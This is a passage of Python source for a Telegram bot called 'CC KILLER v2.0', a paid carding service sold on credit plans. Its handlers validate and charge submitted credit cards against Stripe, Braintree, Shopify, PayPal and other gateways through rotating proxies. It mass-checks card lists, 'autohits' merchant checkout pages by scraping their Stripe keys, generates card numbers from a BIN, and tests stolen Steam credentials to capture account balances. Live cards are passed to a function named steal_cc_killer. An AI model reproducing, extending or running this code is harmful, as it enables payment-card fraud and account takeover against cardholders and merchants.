        await show_main_menu(client, callback_query.message, user_id, is_edit=True)

@app.on_message(filters.command(["b3"]))
async def b3_charge_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error:
        await message.reply(error)
        return

    if not text:
        await message.reply("<b>Usage:</b> /b3 cc|mm|yy|cvv")
        return

    cards = extract_cards(text)
    if not cards:
        await message.reply("❌ No valid cards found.")
        return

    if len(cards) > 1:
        await message.reply("❌ Please check 1 card at a time with this command.")
        return

    card = cards[0]
    cc, mm, yy, cvv = card
    
    user_id = message.from_user.id
    
    # RESTRICTION: B3 Charge
    if not has_feature_access(user_id, "b3"):
        await message.reply("❌ <b>ACCESS DENIED</b>\nThis command (B3 Charge) is a <b>Premium Add-on</b>.\nPlease contact admin to purchase access.")
        return

    if not update_user_credits(user_id, -1):
        await message.reply("❌ Insufficient credits!")
        return

    msg = await message.reply(f"<b>Checking {cc[:12]}xxxx...</b>\nGate: B3 Charge $54 (Braintree)")
    
    start = time.time()
    from config import get_proxy
    proxy = get_proxy()
    
    result = await check_braintree_rotometals(cc, mm, yy, cvv, proxy)
    end = time.time()
    
    # Format Response
    status = result.get("status", "unknown").upper()
    response = result.get("response", "No response")
    
    final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>$Status:</b> {status}
<b>Response >_</b> {response}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> B3 Charge $54
<b>$Proxy:</b> {proxy if proxy else 'Local'}
<b>Time:</b> {end - start:.2f}s
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME}
"""
    await msg.edit(final_text)

def get_gate_function(gate_key: str, check_type: str):
    """Returns the appropriate gate function based on gate key and check type."""
    from gates import (
        check_stripe, check_braintree, check_razorpay, check_razorpay_charge,
        check_shopify, check_shopify_auth, check_payu, check_amazon, 
        check_autohitter, check_nmi, check_payflow,
        check_vbv, check_paypal, check_paypal_avs,
        check_braintree_auth2, check_braintree_charge,
        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
        check_stripe_inbuilt, check_stripe_autohitter_url,
        check_fastspring_auth, check_fastspring_charge,
        check_killer_gate
    )
    
    if check_type == "auth":
        gate_map = {
            "shopify": check_shopify_auth,
            "paypal": check_paypal,
            "razorpay": check_razorpay,
            "stripe": check_stripe,
            "braintree": check_braintree,
            "nmi": check_nmi,
            "payflow": check_payflow,
            "vbv": check_vbv,
        }
    else:  # charged
        gate_map = {
            "shopify": check_shopify,
            "paypal": check_paypal_avs,
            "razorpay": check_razorpay_charge,
            "stripe": check_stripe_sk,
            "braintree": check_braintree_charge,
            "fastspring": check_fastspring_charge,
        }
    
    return gate_map.get(gate_key, check_stripe)

@app.on_message(filters.command(["steam"]))
async def steam_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error:
        await message.reply(error)
        return

    if not text or ":" not in text:
        await message.reply("<b>Usage:</b> /steam user:pass")
        return

    # Support multiple lines: user:pass\nuser:pass
    accounts = [line.strip() for line in text.splitlines() if ":" in line]
    
    if not accounts:
        await message.reply("❌ No valid accounts found.")
        return
        
    user_id = message.from_user.id
    # RESTRICTION: Steam
    if not has_feature_access(user_id, "steam"):
         await message.reply("❌ <b>ACCESS DENIED</b>\nThis command (Steam Checker) is a <b>Premium Add-on</b>.\nPlease contact admin to purchase access.")
         return

    msg = await message.reply(f"<b>Checking {len(accounts)} Steam Account(s)...</b>")
    
    results_text = f"<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 🎮]</b>\n"

    for acc in accounts:
        parts = acc.split(":", 1)
        if len(parts) != 2: continue
        user, password = parts
        
        start = time.time()
        result = await check_steam_account(user, password)
        end = time.time()
        
        status_emoji = "✅" if result.get("status") == "success" else "❌"
        
        results_text += f"- ━━━━━━━━━━━━━━━━━━━━━━ -\n"
        results_text += f"<b>Account >_</b> <code>{user}</code>\n"
        results_text += f"<b>Status:</b> {result.get('response')} {status_emoji}\n"
        
        if result.get("status") == "success":
            cap = result.get("capture", {})
            results_text += f"<b>Balance:</b> {cap.get('Balance')}\n"
            results_text += f"<b>Country:</b> {cap.get('Country')}\n"
            results_text += f"<b>Games:</b> {cap.get('TotalGames')} ({', '.join(cap.get('GamesList', []))})\n"
            results_text += f"<b>Limit:</b> {cap.get('Limited')}\n"
            results_text += f"<b>VAC:</b> {', '.join(cap.get('VAC', [])) or 'None'}\n"
        
        results_text += f"<b>Time:</b> {end - start:.2f}s\n"

    results_text += f"- ━━━━━━━━━━━━━━━━━━━━━━ -\n<b>#Developer >_</b> {DEVELOPER_NAME}"
    
    await msg.edit(results_text)

# ========== AUTOHITTER MESSAGE HANDLER ==========
@app.on_message(filters.text & authorized_filter & ~filters.command(["chk", "mchk", "kl", "gen", "start", "help", "addsite", "addurl", "listsites", "setproxy", "addproxy", "viewproxy", "myproxy", "listproxy", "plans", "addcredit", "setvip", "cancel"]))
async def handle_autohit_input(client, message):
    user_id = message.from_user.id
    
    if user_id not in pending_autohit:
        return  # Not expecting input from this user
    
    action_data = pending_autohit[user_id]
    action = action_data["action"]
    gateway = action_data["gateway"]
    text = message.text.strip()
    
    if action == "add":
        # User is adding a URL
        pending_autohit.pop(user_id, None)
        
        import re
        url_match = re.search(r'https?://[^\s]+', text)
        if not url_match:
            await message.reply("❌ <b>Invalid URL!</b>\n\nPlease provide a valid checkout URL starting with http:// or https://")
            return
        
        url = url_match.group(0)
        if add_hitter_url(gateway, url):
            await message.reply(f"✅ <b>URL Added!</b>\n\n<code>{url}</code>\n\nAdded to {gateway.upper()} autohitter.")
        else:
            await message.reply(f"⚠️ <b>URL already exists!</b>\n\n<code>{url}</code>")
    
    elif action == "remove":
        # User is removing by number
        pending_autohit.pop(user_id, None)
        
        try:
            index = int(text) - 1
            urls = get_hitter_urls(gateway)
            if 0 <= index < len(urls):
                url_to_remove = urls[index]
                if remove_hitter_url(gateway, url_to_remove):
                    await message.reply(f"🗑️ <b>URL Removed!</b>\n\n<code>{url_to_remove}</code>")
                else:
                    await message.reply("❌ <b>Error removing URL!</b>")
            else:
                await message.reply(f"❌ <b>Invalid number!</b>\n\nPlease enter a number between 1 and {len(urls)}.")
        except ValueError:
            await message.reply("❌ <b>Invalid input!</b>\n\nPlease enter a number.")
    
    elif action == "run":
        # User is sending card for autohit
        pending_autohit.pop(user_id, None)
        
        cards = extract_cards(text)
        if not cards:
            await message.reply("❌ <b>Invalid card format!</b>\n\nPlease provide: <code>cc|mm|yy|cvv</code>")
            return
        
        if not update_user_credits(user_id, -2):
            await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 2 Credits\nType /start to check balance.")
            return
        
        card = cards[0]
        urls = action_data["urls"]
        
        status_msg = await message.reply(f"🚀 <b>Running {gateway.upper()} AUTOHIT...</b>\n\nURLs: {len(urls)} | Card: <code>{card[0][:6]}xxxxxx</code>")
        
        from hitter_engine import StripeHitter
        from config import get_proxy
        
        best_result = None
        for i, url in enumerate(urls):
            try:
                await status_msg.edit(f"🚀 <b>{gateway.upper()} AUTOHIT</b>\n\nTrying URL {i+1}/{len(urls)}...")
                
                proxy = get_proxy()
                hitter = StripeHitter(proxy)
                
                if gateway == "stripe":
                    keys = await hitter.grab_keys(url)
                    if keys:
                        result = await hitter.hit_checkout(card[0], card[1], card[2], card[3], keys['pk'], keys['cs'], keys.get('amount'), keys.get('currency', 'usd'), keys.get('email'))
                        result['gate'] = f"Stripe Hitter ({url[:30]}...)"
                    else:
                        result = {"status": "error", "response": "Failed to extract keys", "gate": "Stripe Hitter"}
                elif gateway == "braintree":
                    # For Braintree, use braintree gate
                    from gates import check_braintree_auth
                    result = await check_braintree_auth(card[0], card[1], card[2], card[3], proxy)
                    result['gate'] = f"Braintree Hitter"
                else:
                    result = {"status": "error", "response": "Unknown gateway", "gate": gateway}
                
                if result.get('status') in ["approved", "live", "success", "charged"]:
                    best_result = result
                    break  # Found a hit!
                    
            except Exception as e:
                result = {"status": "error", "response": str(e), "gate": gateway}
        
        if not best_result:
            best_result = result if result else {"status": "dead", "response": "All URLs failed", "gate": gateway}
        
        # Format result
        bin_data = get_bin_info(card[0][:6])
        cc_full = '|'.join(card)
        extrap = f"{card[0][:12]}xxxx|{card[1]}|{card[2]}|xxx"
        
        final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 🎯 AUTOHIT]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc_full}</code>
<b>$Status:</b> {best_result.get('status', 'N/A').upper()} ✨
<b>Response >_</b> {best_result.get('response', 'N/A')}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {best_result.get('gate', gateway.upper())}
<b>$URLs Tried:</b> {len(urls)}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
        """
        
        await status_msg.edit(final_text)
        
        if best_result.get('status') in ["approved", "live", "success", "charged"]:
            await steal_cc_killer(client, message, cc_full, best_result)

@app.on_message(filters.command("cancel") & authorized_filter)
async def cancel_autohit(client, message):
    user_id = message.from_user.id
    if user_id in pending_autohit:
        pending_autohit.pop(user_id)
        await message.reply("❌ <b>Operation cancelled.</b>")
    else:
        await message.reply("ℹ️ <b>Nothing to cancel.</b>")

# ========== /chk - SINGLE CHECKER ==========
@app.on_message(filters.command("chk"))
async def single_check(client, message):
    is_flood, remain = check_flood(message.from_user.id, wait_time=5)
    if is_flood:
        return await message.reply(f"⏳ Wait {remain}s before next check.")

    text = message.text or (message.reply_to_message.text if message.reply_to_message else "")
    cards = extract_cards(text)
    
    if not cards:
        return await message.reply("❌ <b>Provide card:</b> <code>/chk cc|mm|yy|cvv</code>")
    
    # Store card temporarily
    pending_checks[message.from_user.id] = {
        "card": cards[0],
        "message": message,
        "type": None
    }
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 AUTH", callback_data="chk_auth")],
        [InlineKeyboardButton("💰 CHARGED", callback_data="chk_charged")]
    ])
    
    await message.reply(
        f"📊 <b>Single Check - Select Type</b>\n\n"
        f"💳 Card: <code>{cards[0][0][:6]}xxxxxx</code>\n\n"
        f"Choose check type:",
        reply_markup=keyboard
    )

# ========== /mchk - MASS CHECKER ==========
@app.on_message(filters.command("mchk"))
async def mass_check_cmd(client, message):
    is_flood, remain = check_flood(message.from_user.id, wait_time=15)
    if is_flood:
        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")

    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    cards = extract_cards(text)
    
    if not cards:
        return await message.reply("❌ <b>No cards found in text/file.</b>\nUsage: <code>/mchk</code> + upload .txt or paste cards")
    
    # Store cards temporarily
    pending_mass_checks[message.from_user.id] = {
        "cards": cards,
        "message": message,
        "type": None
    }
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 AUTH", callback_data="mchk_auth")],
        [InlineKeyboardButton("💰 CHARGED", callback_data="mchk_charged")]
    ])
    
    await message.reply(
        f"📊 <b>Mass Check - Select Type</b>\n\n"
        f"📥 Cards loaded: <b>{len(cards)}</b>\n\n"
        f"Choose check type:",
        reply_markup=keyboard
    )

# ========== /kl - CC KILLER (SINGLE) ==========
@app.on_message(filters.command("kl"))
async def single_killer_cmd(client, message):
    """💀 Single CC Killer - Runs card through ALL gates aggressively"""
    is_flood, remain = check_flood(message.from_user.id, wait_time=5)
    if is_flood:
        return await message.reply(f"⏳ Wait {remain}s before next check.")

    text = message.text or (message.reply_to_message.text if message.reply_to_message else "")
    cards = extract_cards(text)
    
    if not cards:
        return await message.reply("❌ <b>Provide card:</b> <code>/kl cc|mm|yy|cvv</code>")
    
    if not update_user_credits(message.from_user.id, -2):
        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 2 Credits\nType /start to check balance.")
    
    status_msg = await message.reply("💀 <b>KILLING... (All Gates)</b>")
    
    start_time = time.perf_counter()
    card = cards[0]
    result = await run_all_gates(card)
    end_time = time.perf_counter()
    time_taken = f"{end_time - start_time:.2f}"
    
    bin_data = get_bin_info(card[0][:6])
    cc_full = '|'.join(card)
    extrap = f"{card[0][:12]}xxxx|{card[1]}|{card[2]}|xxx"
    
    final_text = f"""
<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀 KILLER]</b>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Card >_</b> <code>{cc_full}</code>
<b>$Status:</b> {result['status'].upper()} ✨
<b>Response >_</b> {result['response']}
<b>$Extrap:</b> <code>{extrap}</code>
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>Gate >_</b> {result.get('gate', 'KILLER')}
<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
- ━━━━━━━━━━━━━━━━━━━━━━ -
<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
    """
    
    await status_msg.edit(final_text)
    
    if result['status'] in ["approved", "live", "success", "charged"]:
        await steal_cc_killer(client, message, cc_full, result)

# ========== ADMIN COMMANDS ==========
@app.on_message(filters.command("addcredit") & filters.user(OWNER_ID))
async def add_credit_admin(client, message):
    if len(message.command) < 3:
        return await message.reply("❌ <b>Usage:</b> <code>/addcredit user_id amount</code>")
    
    try:
        user_id = int(message.command[1])
        amount = int(message.command[2])
        if update_user_credits(user_id, amount):
            await message.reply(f"✅ <b> {amount} Credits added to {user_id}.</b>")
        else:
            await message.reply("❌ <b>Error updating credits.</b>")
    except Exception as e:
        await message.reply(f"❌ <b>Error:</b> {e}")

@app.on_message(filters.command("setvip") & filters.user(OWNER_ID))
async def set_vip_admin(client, message):
    if len(message.command) < 2:
        return await message.reply("❌ <b>Usage:</b> <code>/setvip user_id</code>")
    
    try:
        user_id = int(message.command[1])
        set_user_vip(user_id, True)
        await message.reply(f"👑 <b> User {user_id} is now VIP (Unlimited Credits).</b>")
    except Exception as e:
        await message.reply(f"❌ <b>Error:</b> {e}")

# ========== UTILITY COMMANDS ==========
@app.on_message(filters.command(["addsite", "addurl"]) & authorized_filter)
async def add_site_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    if not text:
        return await message.reply("❌ <b>Usage:</b> <code>/addsite https://example.com</code> or upload .txt")
    
    import re
    matches = re.findall(r'(?:https?://)?(?:[\w-]+\.)+[\w-]+(?:/[^\s,]*)?', text)
    
    if not matches:
        return await message.reply("❌ <b>No valid URLs found.</b>")

    from config import check_site_valid
    
    status_msg = await message.reply(f"⏳ <b>Verifying {len(matches)} sites...</b>")
    
    added = 0
    valid_sites = []
    
    for url in matches:
        if not url.startswith("http"):
            url = "https://" + url
            
        if await check_site_valid(url):
            await db.add_site(url)
            valid_sites.append(url)
            added += 1
            
    if added > 0:
        await status_msg.edit(f"✅ <b>Verified & Added {added} Sites!</b>\n\nDiscarded {len(matches) - added} invalid/dead sites.")
    else:
        await status_msg.edit("❌ <b>No valid live sites found.</b>")

@app.on_message(filters.command("listsites") & authorized_filter)
async def list_sites_cmd(client, message):
    sites = await db.get_sites()
    if not sites:
        return await message.reply("📭 <b>No sites added yet.</b>")
    
    msg = f"📂 <b>Added Sites:</b> ({len(sites)})\n"
    for site in sites:
        msg += f"• <code>{site}</code>\n"
    await message.reply(msg)

@app.on_message(filters.command(["setproxy", "addproxy"]) & authorized_filter)
async def set_proxy_cmd(client, message):
    text, error = await get_text_from_message(client, message)
    if error: return await message.reply(error)

    if not text:
        return await message.reply("❌ <b>Usage:</b> <code>/setproxy http://user:pass@ip:port</code> or upload .txt")
    
    lines = text.replace(",", "\n").splitlines()
    candidates = []
    
    for line in lines:
        line = line.strip()
        if not line: continue
        
        if line.startswith("http"):
            candidates.append(line)
            continue
            
        parts = line.split(":")
        if len(parts) == 4:
            if "." in parts[0]: 
                host, port, user, pwd = parts
                candidates.append(f"http://{user}:{pwd}@{host}:{port}")
            else:
                user, pwd, host, port = parts
                candidates.append(f"http://{user}:{pwd}@{host}:{port}")
        elif len(parts) == 2:
             candidates.append(f"http://{line}")
             
    if not candidates:
        return await message.reply("❌ <b>No valid proxy formats found.</b>")
    
    status_msg = await message.reply(f"⏳ <b>Verifying {len(candidates)} proxies...</b>")
    
    from config import check_proxy_live, refresh_proxy_cache
    added = 0
    
    for proxy in candidates:
        is_live, latency = await check_proxy_live(proxy)
        if is_live:
            await db.add_proxy(proxy)
            added += 1
            
    if added > 0:
        await refresh_proxy_cache()
        await status_msg.edit(f"✅ <b>Parsed {len(candidates)} -> Added {added} Live Proxies!</b>\n♻️ Cache refreshed.")
    else:
        await status_msg.edit("❌ <b>All proxies were DEAD or invalid.</b>")

@app.on_message(filters.command(["viewproxy", "myproxy", "listproxy"]) & authorized_filter)
async def view_proxy_cmd(client, message):
    proxies = await db.get_proxies()
    
    if not proxies:
        return await message.reply("⚠️ <b>No Live Proxies in DB.</b>\nUsing Direct Connection/Env Proxy.")
    
    msg = f"🔒 <b>Live Proxies:</b> ({len(proxies)} total)\n"
    msg += "━━━━━━━━━━━━━━━━━━━\n"
    
    for i, proxy in enumerate(proxies[:15], 1):
        masked = proxy[:30] + "..." if len(proxy) > 30 else proxy
        msg += f"{i}. <code>{masked}</code>\n"
    
    if len(proxies) > 15:
        msg += f"<i>...and {len(proxies)-15} more</i>\n"
    
    msg += "\n♻️ <i>Rotating automatically</i>"
    await message.reply(msg)

@app.on_message(filters.command("plans"))
async def plans_command(client, message):
    plans_text = f"""
💎 <b>AVAILABLE PLANS:</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>BASIC PLAN</b>
• Credits: 100
• Price: $5
• Access: All Gates

🚀 <b>STANDARD PLAN</b>
• Credits: 500
• Price: $20
• Access: All Gates + Priority

👑 <b>ULTIMATE PLAN</b> (Recommended 🔥)
• Credits: 2000
• Price: $50
• Access: All Gates + Priority

🛡️ <b>VIP PLAN</b>
• Credits: <b>UNLIMITED</b>
• Price: $100
• Access: VIP Gates + Support
• Validity: 30 Days

💳 <b>PAYMENT METHODS:</b>
• UPI ID: <code>{UPI_ID}</code>
• QR Code: /start -> View Plans -> View QR

⚠️ <b>IMPORTANT: Send payment screenshot to support after paying!</b>
    """
    await message.reply(plans_text, reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔰 BASIC", callback_data="req_BASIC"), InlineKeyboardButton("🚀 STANDARD", callback_data="req_STANDARD")],
        [InlineKeyboardButton("👑 ULTIMATE", callback_data="req_ULTIMATE")],
        [InlineKeyboardButton("🛡️ VIP", callback_data="req_VIP")]
    ]))

@app.on_message(filters.command("gen"))
async def generate_cards_cmd(client, message):
    if len(message.command) < 2:
        return await message.reply("❌ <b>Usage:</b> <code>/gen 456789</code> (Optional amount 1-10)")
    
    bin_str = message.command[1].strip()
    if not bin_str.isdigit() or len(bin_str) < 6:
        return await message.reply("❌ <b>Error:</b> Provide a valid 6-digit BIN.")
    
    count = 10
    if len(message.command) >= 3:
        try:
            count = int(message.command[2])
            if count > 10: count = 10
            if count < 1: count = 1
        except: pass
        
    cards = generate_cards(bin_str, count)
    if not cards:
        return await message.reply("❌ <b>Error:</b> Failed to generate cards. Enter a valid BIN.")
        
    bin_info = get_bin_info(bin_str[:6])
    
    response = f"""
💳 <b>CC KILLER GENERATOR v1.0</b>
━━━━━━━━━━━━━━━━━━━━━━━
📍 BIN: <code>{bin_info}</code>
📊 Count: <code>{len(cards)}</code>

<code>"""
    for c in cards:
        response += f"{c}\n"
    response += "</code>\n━━━━━━━━━━━━━━━━━━━━━━━"
    
    await message.reply(response)

# ========== REGISTRATION COMMANDS ==========
@app.on_message(filters.command("register"))
async def register_cmd(client, message):
    """Register new user with optional referral code."""
    user = message.from_user
    user_id = user.id
    
    # Check if already registered
    existing = await db.get_user(user_id)
    if existing and existing.get('is_registered'):
        return await message.reply(
            f"✅ <b>Already Registered!</b>\n\n"
            f"👤 User: <b>{user.first_name}</b>\n"
            f"🆔 ID: <code>{user_id}</code>\n\n"
            f"Use /profile to view your profile."
        )
    
    # Register user
    user_data = await db.create_user(
        user_id=user_id,
        username=user.username,
        first_name=user.first_name,
        referral_code=None
    )
    
    if user_data:
        welcome_msg = f"""
🎉 <b>REGISTRATION SUCCESSFUL!</b>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> {user.first_name}
🆔 <b>ID:</b> <code>{user_id}</code>
💳 <b>Credits:</b> 10 (Welcome Gift!)
"""
        
        welcome_msg += "\n\nUse /profile to view your profile."
        
        await message.reply(welcome_msg)
    else:
        await message.reply("❌ <b>Registration failed!</b> Please try again later.")

@app.on_message(filters.command("profile"))
async def profile_cmd(client, message):
    """View user profile."""
    user_id = message.from_user.id
    user_data = await db.get_user(user_id)
    
    if not user_data or not user_data.get('is_registered'):
        return await message.reply("❌ <b>Not registered!</b>\nUse /register to create your account.")
    

    
    profile_text = f"""
👤 <b>YOUR PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {user_data.get('first_name', 'N/A')}
📛 <b>Username:</b> @{user_data.get('username', 'N/A')}
🆔 <b>ID:</b> <code>{user_id}</code>

💰 <b>Credits:</b> {'UNLIMITED' if user_data.get('is_vip') else user_data.get('credits', 0)}
📈 <b>Plan:</b> {user_data.get('plan', 'FREE')}
{'<b>VIP:</b> ✅ Yes' if user_data.get('is_vip') else ''}
{f"<b>Expiry:</b> {user_data.get('expiry')}" if user_data.get('expiry') else ''}

📅 <b>Joined:</b> {user_data.get('joined_at', 'N/A')}
    """
    
    await message.reply(profile_text)



@app.on_message(filters.command("users") & filters.user(OWNER_ID))
async def admin_users_cmd(client, message):
    """Admin command to view all registered users."""
    page = 0
    if len(message.command) > 1:
        try:
            page = int(message.command[1]) - 1
            if page < 0: page = 0
        except: pass
    
    limit = 15
    offset = page * limit
    
    total_users = await db.get_user_count()
    users = await db.get_all_users(limit=limit, offset=offset)
    
    if not users:
        return await message.reply("📭 <b>No registered users found.</b>")
    
    users_text = f"""
👥 <b>REGISTERED USERS</b> (Page {page + 1})
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Total:</b> {total_users} users

"""
    
    for i, user in enumerate(users, offset + 1):
        vip_badge = "👑" if user.get('is_vip') else ""
        users_text += f"{i}. {vip_badge} <code>{user.get('user_id')}</code> | {user.get('first_name', 'N/A')} | 💳 {user.get('credits', 0)}\n"
    
    users_text += f"\n<i>Use /users {page + 2} for next page</i>"
    
    await message.reply(users_text)

if __name__ == "__main__":
    from pyrogram import idle
    from pyrogram.types import BotCommand
    
    async def main():
        # Initialize database
        print("🗄️ Initializing database...")
        await db.init()
        print("✅ DATABASE READY")
        
        while True:
            try:
                await app.start()
                break
            except Exception as e:
                error_str = str(e)
                if "FLOOD_WAIT" in error_str or "420" in error_str:
                    import re
                    match = re.search(r'\d+', error_str)
                    seconds = int(match.group()) if match else 300
                    wait_time = seconds + 10
                    print(f"⚠️ FLOOD WAIT DETECTED! Sleeping for {wait_time}s to fix... (DO NOT RESTART)")
                    await asyncio.sleep(wait_time)
                    print("♻️ RETRYING CONNECTION...")
                else:
                    raise e

        print("🚀 CC KILLER v2.0 STARTED")
        
        commands = [
            BotCommand("start", "Start Bot / Menu"),
            BotCommand("register", "Register Account"),
            BotCommand("profile", "View Profile"),
            BotCommand("chk", "Check Single Card"),
            BotCommand("mchk", "Mass Check Cards"),
            BotCommand("kl", "CC Killer (Single)"),
            BotCommand("b3", "B3 Charge ($54)"),
            BotCommand("steam", "Steam Account Checker"),
            BotCommand("gen", "Generate Cards from BIN"),
            BotCommand("setproxy", "Set Proxy"),
            BotCommand("viewproxy", "View Proxy"),
            BotCommand("addsite", "Add Merchant Site"),
            BotCommand("listsites", "View Sites"),
            BotCommand("plans", "View Plans")
        ]
        try:
            await app.set_bot_commands(commands)
            print("✅ COMMANDS CONFIGURED")
        except Exception as e:
            print(f"❌ Failed to set commands: {e}")
        
        from queue_manager import init_queue
        await init_queue()
        print("✅ QUEUE SYSTEM READY")
            
        await idle()
        await app.stop()
        
    app.run(main())
